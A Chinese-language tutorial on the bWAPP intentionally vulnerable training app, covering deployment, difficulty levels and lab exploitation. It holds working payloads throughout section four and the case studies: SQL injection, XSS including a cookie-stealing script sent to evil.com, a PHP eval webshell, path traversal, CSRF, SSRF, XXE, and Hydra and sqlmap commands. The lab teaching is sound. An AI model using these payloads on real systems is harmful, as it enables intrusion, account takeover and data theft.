# 靶场6：bWAPP — 漏洞种类最丰富的 PHP 靶场

> **难度等级**：🟡 中等
> **预计学习时间**：120 分钟
> **学习目标**：
> - 了解 bWAPP 的架构与漏洞分类体系
> - 掌握 bWAPP 的 Docker 部署方法
> - 熟悉 bWAPP 的三级难度切换机制
> - 掌握至少 5 大类漏洞的利用方法
> - 能够独立完成 10+ 漏洞的复现

---

## 一、bWAPP 介绍

### 1.1 什么是 bWAPP

bWAPP（**b**uggy **W**eb **App**lication）是一款由比利时安全研究员 Malik Mesellem 开发的 PHP 漏洞练习平台。它是目前漏洞种类最丰富的 Web 靶场之一，内置了超过 **100 种** 漏洞场景。

> 💡 **大白话说bWAPP——"漏洞大百科"**
>
> 如果说DVWA是"入门必打"，那bWAPP就是"广度之王"——它包含了超过100种漏洞，是你见过的漏洞种类最多的靶场。
>
> DVWA有10个漏洞模块，bWAPP有100+。学完DVWA再来bWAPP，你会感觉"原来还有这么多我没见过的漏洞类型"。
>
> 它还有个特别友好的设计：**每个漏洞都标记了"A1-Injection"、"A2-Broken Auth"这样的OWASP编号**。你在打靶的同时，就建立起了和OWASP Top 10的对应关系——这对以后面试和考证特别有帮助。

bWAPP 基于 PHP + MySQL 构建，界面简洁明了，支持三种安全级别（低/中/高），非常适合从入门到进阶的逐步学习。

### 1.2 bWAPP 的特点

| 特点 | 说明 |
|------|------|
| **漏洞数量多** | 100+ 种漏洞场景，覆盖 OWASP Top 10 |
| **三级难度** | low / medium / high 三档，循序渐进 |
| **分类清晰** | 按漏洞类型分类，方便系统学习 |
| **PHP 生态** | 基于 PHP，贴近真实 Web 开发场景 |
| **轻量级** | 资源占用少，部署简单 |
| **Bee-box** | 提供预装虚拟机，开箱即用 |

### 1.3 适合人群

- Web 安全初学者
- PHP 开发者学习安全
- 想要全面了解 Web 漏洞类型的爱好者
- 安全培训教学使用

---

## 二、环境搭建

### 2.1 方式一：Docker 部署（推荐）

```bash
# 拉取镜像
docker pull raesene/bwapp

# 启动容器
docker run -d -p 80:80 --name bwapp raesene/bwapp
```

访问 `http://localhost/bWAPP`，首次访问需要点击 `here` 进行安装（创建数据库）。

默认登录账号：
- 用户名：`bee`
- 密码：`bug`

### 2.2 方式二：Bee-box 虚拟机

bWAPP 官方提供了预装在 Ubuntu 中的虚拟机镜像（Bee-box），可以直接导入 VMware 或 VirtualBox 使用。

下载地址：https://sourceforge.net/projects/bwapp/files/bee-box/

### 2.3 方式三：手动部署（PHP + MySQL）

如果你已经有 PHP + MySQL 环境，可以手动部署：

```bash
# 下载源码
wget https://sourceforge.net/projects/bwapp/files/latest/download -O bwapp.zip
unzip bwapp.zip -d /var/www/html/

# 修改配置
cd /var/www/html/bWAPP
cp admin/settings.php admin/settings.php.bak
# 编辑 admin/settings.php，配置数据库连接信息
```

然后访问 `http://localhost/bWAPP/install.php` 进行安装。

### 2.4 界面介绍

登录后，bWAPP 主要分为以下区域：

1. **顶部导航栏**：难度选择、登录信息、帮助链接
2. **左侧菜单**：漏洞分类列表
3. **中间内容区**：漏洞实验页面
4. **底部信息**：版本信息、开发者信息

### 2.5 难度等级说明

bWAPP 提供三个安全级别：

| 级别 | 特点 | 适合阶段 |
|------|------|----------|
| **Low** | 完全没有防护，直接利用 | 入门学习 |
| **Medium** | 有简单过滤，需要绕过 | 进阶学习 |
| **High** | 防护较完善，利用较难 | 高级挑战 |

通过顶部的 "Security level" 下拉菜单可以随时切换难度。

---

> 💡 **大白话说bWAPP的漏洞分类——"100多种病症的医院分科室"**
>
> bWAPP有100多个漏洞，如果不分类，你就像走进了一个没有指示牌的超大医院——根本不知道该去哪。
>
> bWAPP非常聪明，它把100多个漏洞分成了7大类：
> - **注入类** = 内科（病因：外部有害物质进入内部系统）
> - **认证会话类** = 门禁科（病因：门锁坏了，谁都能进）
> - **访问控制类** = 权限科（病因：普通人进了VIP室）
> - **输入验证类** = 安检科（病因：没检查行李里带了什么危险品）
> - **信息泄露类** = 保密科（病因：不该让人知道的被人知道了）
> - **加密相关类** = 密码科（病因：加密算法太弱，钥匙太好配）
> - **其他类** = 综合科（各种疑难杂症）
>
> 而且bWAPP给每个漏洞都标注了OWASP编号（如A1-Injection、A2-Broken Auth），这样你在练习的时候，大脑里就自动建立起了和OWASP Top 10的对应关系。就像学英语单词同时背了词根词缀，效率翻倍。
>
> **一个高效的学习方法**：不用每个漏洞都打一遍。每个分类选3-5个代表性的漏洞（从低到高难度各打一遍），就能掌握这一类漏洞的核心思路。剩下的就是"换汤不换药"。

## 三、漏洞分类概览

bWAPP 将 100+ 漏洞分为以下几大类：

### 3.1 注入类（Injection）

- SQL 注入（GET/POST/Header/Cookie/盲注等多种场景）
- LDAP 注入
- XPath 注入
- OS 命令注入
- HTML/JS 注入（XSS）
- PHP 代码注入
- XPath 注入
- SSI 注入

### 3.2 认证与会话管理（Authentication & Session Management）

- 暴力破解（表单、HTTP 认证）
- 会话固定
- 会话劫持
- 密码重置漏洞
- 不安全的验证码

### 3.3 访问控制（Access Control）

- 目录遍历
- 本地文件包含（LFI）
- 远程文件包含（RFI）
- 越权访问
- CORS 配置错误

### 3.4 输入验证（Input Validation）

- XSS（反射型、存储型、DOM 型、多种场景）
- CSRF
- XXE
- SSRF
- 上传漏洞

### 3.5 敏感信息泄露（Information Disclosure）

- 错误信息泄露
- 源代码泄露
- 目录列表
- 备份文件
- 配置信息泄露

### 3.6 加密相关（Cryptographic Issues）

- 弱加密算法
- 不安全的哈希
- 证书问题

### 3.7 其他（Other）

- XML 外部实体注入
- 不安全的反序列化
- 点击劫持
- Flash 安全问题
- AJAX 安全问题

---

## 四、重点漏洞详解

### 4.1 SQL 注入系列

bWAPP 提供了多种 SQL 注入场景，是学习 SQL 注入的绝佳平台。

#### 4.1.1 SQL 注入（GET/Search）

**场景**：搜索功能，通过 GET 参数传递搜索关键词。

**Low 级别 Payload**：

```
# 测试注入点
' OR '1'='1

# UNION 查询获取数据
' UNION SELECT 1,2,3,4,5,6,7-- -

# 获取数据库名
' UNION SELECT 1,database(),3,4,5,6,7-- -

# 获取所有表名
' UNION SELECT 1,group_concat(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -
```

**Medium 级别绕过**：

Medium 级别可能会过滤单引号，可以尝试：
- 双写绕过：`'' OR ''1''=''1`
- 编码绕过：URL 编码、Unicode 编码
- 注释符绕过

#### 4.1.2 SQL 注入（POST/Login）

**场景**：登录表单，经典的万能密码场景。

**Low 级别万能密码**：

```
用户名：admin' --
密码：任意
```

或：
```
用户名：' OR '1'='1' --
密码：任意
```

#### 4.1.3 SQL 盲注

**场景**：页面不显示查询结果，只显示成功/失败。

**布尔盲注 Payload**：

```
# 判断数据库名长度
' AND LENGTH(database())>5-- -

# 逐字符猜解数据库名
' AND ASCII(SUBSTRING(database(),1,1))=98-- -
```

**时间盲注 Payload**：

```
# 如果第一个字符是 b，延迟 5 秒
' AND IF(ASCII(SUBSTRING(database(),1,1))=98,SLEEP(5),0)-- -
```

#### 4.1.4 SQL 注入（Header）

**场景**：User-Agent 或 Referer 头被插入数据库。

使用 Burp Suite 抓包，修改 User-Agent：

```
User-Agent: ' OR (SELECT SLEEP(5))-- -
```

### 4.2 XSS 系列

bWAPP 的 XSS 场景非常丰富，覆盖各种注入位置和绕过技巧。

#### 4.2.1 反射型 XSS（GET）

**场景**：URL 参数直接输出到页面。

**Low 级别**：
```
/?title=<script>alert('XSS')</script>
```

**Medium 级别绕过**（过滤了 `<script>`）：
```
/?title=<img src=x onerror=alert(1)>
/?title=<svg onload=alert(1)>
/?title=<body onload=alert(1)>
```

**High 级别绕过**（更严格的过滤）：
```
/?title=<scr<script>ipt>alert(1)</scr</script>ipt>
```

#### 4.2.2 存储型 XSS

**场景**：留言板功能，输入内容存储在数据库中。

在留言框输入：
```html
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

每次有人访问留言板，Cookie 就会被窃取。

#### 4.2.3 DOM 型 XSS

**场景**：前端 JavaScript 直接使用 URL 参数操作 DOM。

分析页面源码中的 JS 代码，找到类似：
```javascript
document.write(location.hash.substring(1));
```

构造 Payload：
```
http://target/bwapp/xss_dom.php#<img src=x onerror=alert(1)>
```

#### 4.2.4 XSS 其他场景

bWAPP 还包含以下特殊 XSS 场景：

- **XSS - AJAX/JSON**：JSON 响应中的 XSS
- **XSS - Flash**：Flash 对象中的 XSS
- **XSS - Cookie**：Cookie 值导致的 XSS
- **XSS - Referer**：Referer 头导致的 XSS
- **XSS - User-Agent**：User-Agent 头导致的 XSS

### 4.3 认证漏洞

#### 4.3.1 暴力破解

**场景**：登录表单无限制，可以无限尝试。

**使用 Burp Suite 爆破**：
1. 抓登录请求，发送到 Intruder
2. 设置用户名和密码变量
3. 加载字典，开始爆破
4. 根据响应长度判断成功

**使用 Hydra 爆破**：
```bash
hydra -L users.txt -P pass.txt target http-post-form \
"/bWAPP/login.php:login=^USER^&password=^PASS^&form=submit:F=Invalid"
```

#### 4.3.2 会话固定

**原理**：攻击者可以设置用户的 Session ID，当用户登录后，攻击者使用相同的 Session ID 即可劫持会话。

> 💡 **大白话说会话固定——"我先占个挂号票，等你填好个人信息我再拿走"**
>
> 会话固定攻击特别好理解，用医院看病的例子：
> 1. 攻击者去医院挂了个号，拿到一张就诊卡（PHPSESSID = abc123）
> 2. 攻击者把这个就诊卡塞给你，说"用这张卡不用排队"
> 3. 你用这张卡挂了号，还记录了你的个人信息（登录成功）
> 4. 攻击者拿出同样的就诊卡副本，一刷——看到了你的所有就诊记录，还能以你的身份开药
>
> 本质是：**Session ID在登录前就已经被攻击者确定了，而网站登录后没有换一张新的Session ID**。就像银行卡的密码被提前设置好了，换钱的时候不给你一张新卡。
>
> 防御方法很简单：**登录成功后，生成一个新的Session ID**。用户一登录，旧的治疗卡作废，换一张新的——攻击者手上的卡立刻变成废纸。

**利用步骤**：
1. 攻击者访问网站，获取 PHPSESSID
2. 构造带有 PHPSESSID 的链接发给用户
3. 用户点击链接并登录
4. 攻击者使用相同的 PHPSESSID 访问，即获得用户身份

### 4.4 文件上传/下载

#### 4.4.1 文件上传漏洞

**场景**：允许用户上传文件，但未做严格校验。

**Low 级别**：
直接上传 PHP 一句话木马：
```php
<?php eval($_REQUEST['cmd']); ?>
```

上传后访问上传路径，执行命令：
```
http://target/images/shell.php?cmd=phpinfo();
```

**Medium 级别绕过**（检查 Content-Type）：
- 使用 Burp 修改 Content-Type 为 `image/gif`
- 或在文件开头加上 `GIF89a`

**High 级别绕过**（检查文件头+扩展名）：
- `%00` 截断（PHP < 5.3.4）
- 文件名大小写绕过：`shell.php5`、`shell.phtml`
- .htaccess 解析绕过

#### 4.4.2 不安全的文件下载

**场景**：下载功能通过参数指定文件名，可下载任意文件。

**Payload**：
```
/download.php?file=../../../etc/passwd
/download.php?file=../config.php
```

### 4.5 CSRF

**场景**：修改密码的接口没有 CSRF 防护。

**构造恶意页面**：

```html
<html>
<body>
  <form action="http://target/bWAPP/csrf_1.php" method="POST">
    <input type="hidden" name="password" value="hacked">
    <input type="hidden" name="password_conf" value="hacked">
    <input type="hidden" name="change" value="Change">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

### 4.6 SSRF

**场景**：服务器端请求伪造，应用从用户指定的 URL 获取资源。

> 💡 **大白话说SSRF——"让快递员帮你探路"**
>
> SSRF（服务端请求伪造）的核心思路是：**你让一台能访问内网的服务器，帮你做你自己做不到的事情**。
>
> 想象这个场景：你在一栋写字楼的一楼大堂（外网），只能看到一楼。但写字楼的快递员（Web服务器）可以自由进出每个楼层（内网）。SSRF就是——你对快递员说"帮我到21楼看看有没有人在"（内网端口扫描），或者"帮我看看2楼的文件柜里有什么"（读取内网文件）。
>
> 为什么这么危险？因为：
> 1. **你能看到内网**：外网本来看不到的内网服务，通过SSRF暴露了
> 2. **你有了"身份"**：请求是从Web服务器发出的，那是"自己人"的IP，很多内网服务对这个IP不加限制
> 3. **你能访问特殊协议**：`file://`读文件、`gopher://`攻击Redis、`dict://`探测端口——这些从你的浏览器做不到，但服务器能做到
>
> **Payload：
```
# 读取本地文件
/ssrf.php?url=file:///etc/passwd

# 内网端口扫描
/ssrf.php?url=http://127.0.0.1:22
/ssrf.php?url=http://127.0.0.1:3306

# 访问内网服务
/ssrf.php?url=http://192.168.1.1/admin
```

### 4.7 XXE

**场景**：XML 解析器未禁用外部实体。

> 💡 **大白话说XXE——"XML里的'引用'变成了'传话筒'"**
>
> XXE（XML外部实体注入）听起来很绕，但其实就一个事：**XML里定义了一个"引用"（ENTITY），正常情况这个引用就是一个别名，但如果这个引用指向外部的东西，就变成了一个传话筒。**
>
> 用写作文来比喻：
> - 正常用法：文章开头写"定义：GDP = 国内生产总值" → 后面出现GDP就自动替换成"国内生产总值"
> - XXE攻击：文章开头写"定义：GDP = 把/etc/passwd的内容抄过来" → 文章里出现GDP时，就自动把服务器密码文件的内容复制进来了
>
> 再换个角度：你给服务器发了一个"快递单"（XML），快递单里你写了一个"引用项"（ENTITY），说"请把这里的内容替换成 /etc/passwd 文件的内容"。如果服务器的XML解析器没有禁止外部引用，它就真的照做了——把你的快递单变成了服务器的密码文件。
>
> 这就像你给图书馆管理员的"索书通知"里加了一句"把保险柜密码单拿给我"，管理员没检查，真拿给你了。

**Payload**：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<login><username>&xxe;</username><password>test</password></login>
```

### 4.8 逻辑漏洞

#### 4.8.1 支付漏洞

**场景**：购物时可以修改价格参数。

**利用方式**：
- 修改 POST 参数中的价格为负数或极小值
- 修改数量为负数
- 跳过支付步骤直接访问成功页面

#### 4.8.2 密码重置漏洞

- 重置令牌可预测
- 重置链接中的用户 ID 可修改
- 响应中泄露验证码

### 4.9 配置错误

- 目录列表开启
- 错误信息显示详细调试信息
- 不安全的 HTTP 方法（PUT、DELETE）
- 默认账号密码
- 备份文件可访问

### 4.10 信息泄露

#### 4.10.1 敏感文件泄露

- `.git` 目录泄露
- 备份文件（`.bak`、`.swp`、`.old`）
- `phpinfo()` 页面
- 配置文件

#### 4.10.2 错误信息泄露

触发错误，查看报错信息中的：
- 数据库连接信息
- 文件绝对路径
- SQL 查询语句
- 服务器版本信息

---

## 五、三级难度详解

> 💡 **大白话说bWAPP的三级难度——"热身、训练、比赛"三层递进**
>
> bWAPP的Low/Medium/High三级难度设计非常有教学意义，用体育来比喻：
>
> **Low（低难度）= 热身阶段**
> - 对方站着不动让你打，你只需要把基本动作做对
> - 比如SQL注入直接用 `' OR '1'='1`，完全没有任何阻拦
> - 这个阶段你的目标是**学会"长什么样"**——知道这个漏洞的典型表现是什么样的
>
> **Medium（中难度）= 训练阶段**
> - 对方做简单的防守动作，你需要用变招绕过
> - 比如单引号被过滤了 → 你就用双写 `''`、编码绕过等方式
> - 这个阶段你的目标是**学会"怎么绕过"**——掌握基本的绕过技巧
>
> **High（高难度）= 比赛级别**
> - 防守比较严密，需要组合技才能突破
> - 你可能需要：编码绕过 + 大小写变换 + 标签替换 + 注释符混用
> - 这个阶段你的目标是**理解"防御是怎么做的"**——即使你打不穿，你也学会了防御方法，这在真实工作中更值钱
>
> **一个重要的学习心态**：High级别不一定要打穿。打穿了说明你厉害，打不穿你至少知道了"这样的防御能达到什么效果"。很多开发者和防御路线的人，反而是从High级别的代码里学到的防御方案。

### 5.1 Low 级别

- 几乎没有任何安全防护
- 直接使用标准 Payload 即可利用
- 适合初学者理解漏洞原理

**示例**：SQL 注入直接用 `' OR '1'='1` 即可绕过登录。

### 5.2 Medium 级别

- 有简单的过滤或防护措施
- 需要使用绕过技巧
- 适合进阶学习

**常见绕过方法**：
- 大小写绕过：`<ScRiPt>`
- 双写绕过：`<scr<script>ipt>`
- 编码绕过：HTML 实体编码、URL 编码
- 替换标签：用 `<img>` 替代 `<script>`

### 5.3 High 级别

- 防护措施相对完善
- 需要更高级的绕过技巧
- 部分题目几乎无法利用（更贴近真实安全场景）

**学习建议**：High 级别可以作为挑战题，尝试能否绕过，即使无法绕过也能学习到防御方法。

---

## 六、实战案例

### 案例 1：SQL 注入系列通关 —— 从入门到盲注

**目标**：在 bWAPP 的 SQL Injection 课程中，从 Low 到 High 级别全部通关。

**步骤**：

**Level 1：Low 级别 GET 注入**

1. 访问 SQL Injection (GET/Search) 页面
2. 输入 `'` 测试，报错说明存在注入
3. 使用 `' OR '1'='1` 查询所有数据
4. 使用 UNION 查询获取管理员密码：
```
' UNION SELECT 1,login,password,email,5,6,7 FROM users-- -
```

**Level 2：Medium 级别绕过**

1. Medium 级别可能对单引号做了转义
2. 尝试使用双写：`'' OR ''1''=''1`
3. 或使用数字型注入（如果参数是数字）

**Level 3：SQL 盲注**

1. 访问 SQL Injection (Blind) 页面
2. 使用布尔盲注逐字符猜解：
```
# 判断第一个字符
' AND ASCII(SUBSTRING(database(),1,1))>97-- -
# 二分法猜解每个字符
```
3. 可以使用 SQLMap 自动跑：
```bash
sqlmap -u "http://target/bWAPP/sqli_blind.php?id=1" --dbs
```

### 案例 2：XSS 各种场景 —— 10 种 XSS 全通关

**2.1 反射型 XSS**

场景：`xss_get.php`

Low：`<script>alert(1)</script>`
Medium：`<img src=x onerror=alert(1)>`
High：尝试各种编码绕过

**2.2 存储型 XSS**

场景：留言板 `xss_stored.php`

提交 Payload，然后刷新页面验证。

**2.3 DOM 型 XSS**

场景：`xss_dom.php`

分析 JS 源码，找到 `document.write()` 或 `innerHTML`，构造：
```
xss_dom.php#<img src=x onerror=alert(document.domain)>
```

**2.4 其他特殊场景**

- XSS - Cookie：修改 Cookie 值注入
- XSS - Referer：修改 Referer 头注入
- XSS - User-Agent：修改 User-Agent 头注入

### 案例 3：文件上传绕过 —— 三级难度挑战

**3.1 Low 级别**

直接上传 PHP 文件，成功。

**3.2 Medium 级别**

检查 Content-Type，用 Burp 修改：
```
Content-Type: image/jpeg
```
或在文件头部加 `GIF89a`。

**3.3 High 级别**

检查文件内容和扩展名：

**方法 1：图片马 + 文件包含**
```bash
# 制作图片马
cat shell.php >> normal.jpg
```
上传后通过文件包含执行：
```
/file.php?file=images/normal.jpg
```

**方法 2：.htaccess 解析**
上传 `.htaccess` 文件：
```
AddType application/x-httpd-php .jpg
```
然后上传 .jpg 的 PHP 代码文件。

### 案例 4：认证绕过 —— 多种方法登录管理员

**方法 1：SQL 注入万能密码**
```
用户名：admin' --
密码：任意
```

**方法 2：暴力破解**
使用 Burp Intruder 或 Hydra 爆破弱密码。

**方法 3：会话固定**
1. 先获取一个 PHPSESSID
2. 构造链接诱导管理员登录
3. 使用相同 PHPSESSID 访问

**方法 4：XSS 窃取 Cookie**
通过存储型 XSS 获取管理员的 Cookie，然后替换登录。

### 案例 5：信息泄露利用 —— 收集敏感信息

**步骤**：

1. **目录扫描**：使用 dirsearch 或 gobuster 扫描目录
```bash
dirsearch -u http://target/bWAPP/ -e php,bak,swp,old
```

2. **发现 phpinfo**：访问 `phpinfo.php`，获取服务器配置信息

3. **发现备份文件**：找到 `settings.php.bak`，下载获取数据库密码

4. **错误信息泄露**：触发 SQL 报错，获取数据库名、表名等信息

5. **目录列表**：发现 `admin/` 目录可列表，找到管理后台

---

## 七、练习题

### 基础题

1. **bWAPP 的全称是什么？它基于什么技术栈构建？**

2. **bWAPP 的默认登录账号和密码是什么？**

3. **bWAPP 提供哪三个安全级别？它们有什么区别？**

4. **SQL 注入中，万能密码 `admin' --` 的原理是什么？**

5. **文件上传漏洞有哪些常见的绕过方式？至少列举 4 种。**

### 进阶题

6. **反射型 XSS 和存储型 XSS 的主要区别是什么？哪个危害更大？为什么？**

7. **什么是 SSRF？SSRF 可以用来做哪些事情？**

8. **什么是会话固定攻击？如何防御？**

9. **XXE 漏洞读取文件的 Payload 是什么？如果回显被禁用，如何获取文件内容？**

10. **在 bWAPP 的 High 级别中，文件上传检查了图片文件头和扩展名，请描述两种可以绕过的方法。**

---

## 八、安全提醒

> ⚠️ **重要声明**
>
> 本靶场仅用于**授权环境下的安全学习和研究**。请严格遵守以下原则：
>
> 1. **仅限本地学习**：所有实验请在本地搭建的 bWAPP 环境中进行。
> 2. **未经授权不得攻击**：不得对任何未经授权的网站或系统进行渗透测试。
> 3. **遵守法律法规**：学习过程中请遵守《网络安全法》等相关法律法规。
> 4. **文明上网**：不得利用所学知识从事任何违法活动。
> 5. **负责任的披露**：如果在真实环境中发现漏洞，请通过正规渠道负责任地披露。

---

*完成本章节后，你将对 Web 安全漏洞的多样性有更全面的认识，并掌握多种漏洞的利用与绕过技巧。*
